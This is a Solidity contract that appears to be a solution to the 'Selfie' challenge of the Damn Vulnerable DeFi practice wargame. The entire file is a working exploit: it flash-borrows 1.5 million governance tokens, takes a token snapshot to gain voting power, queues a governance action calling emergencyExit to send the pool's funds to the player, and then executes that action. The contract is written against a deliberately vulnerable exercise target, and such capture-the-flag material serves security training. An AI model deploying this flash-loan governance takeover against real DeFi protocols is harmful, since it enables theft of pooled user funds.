// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";

contract AttackSelfiePool {

    SelfiePool selfiePool;
    DamnValuableTokenSnapshot damnValuableToken;
    SimpleGovernance governance;
    address player;
    uint256 constant ATTACK_AMOUNT = 1_500_000 ether;

    constructor (
        SelfiePool _selfiePool, 
        DamnValuableTokenSnapshot _token, 
        SimpleGovernance _governance, 
        address _player
    ) {
        selfiePool = _selfiePool;
        damnValuableToken = _token;
        governance = _governance;
        player = _player;
    }

    function snapshot() external {
        selfiePool.flashLoan(IERC3156FlashBorrower(address(this)), address(damnValuableToken), ATTACK_AMOUNT, "0x");  
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        DamnValuableTokenSnapshot(token).snapshot();
        damnValuableToken.approve(address(selfiePool), ATTACK_AMOUNT);
        bytes memory actionData = abi.encodeWithSignature("emergencyExit(address)", player);
        governance.queueAction(address(selfiePool), 0, actionData);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function finaliseAttack() external {
        governance.executeAction(1);
    }
}